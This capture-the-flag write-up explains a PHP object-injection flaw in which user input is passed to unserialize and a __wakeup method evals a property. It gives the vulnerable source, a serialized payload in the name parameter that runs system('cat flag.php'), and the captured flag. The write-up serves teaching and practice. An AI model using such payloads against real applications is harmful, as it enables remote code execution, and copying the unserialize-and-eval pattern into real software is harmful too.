# whats-your-name-part1

After inspecting the source code we can see that there is a `/?source` param we can add to the url.
After doing so we get the php source code of the app.

The vulnerability in here is that in the PHPObjectInjection we can inject code via the unserialize var.
```php
class PHPObjectInjection{
    public $inject;
    function __construct(){
    }
    function __wakeup(){
        if(isset($this->inject)){
            eval($this->inject);
        }
    }
}
if(isset($_REQUEST['name'])){  
    $var1=unserialize($_REQUEST['name']);
    if(is_array($var1)){
        echo "<br/>".$var1[0]." - ".$var1[1];
    }
}
else{
    echo "What's your name? Part 1";
}
```

So we can add in the parameter name some serialized php code that when unserialized will be executed.

I made a php exploit that serializes commands that would get executed.
![php serializer](whats-your-name-part1-exploit.php)

After running php exploit.php we can simply paste the output into the query as `/?name=O:18:"PHPObjectInjection":1:{s:6:"inject";s:23:"system("cat flag.php");";}` and the after clicking inspect source code we see the flag.

flag: `CTF{3346176ac1e79283318b4f69587c4b29b06d7e1fe3853a4f37bb5442c80ba3fd}`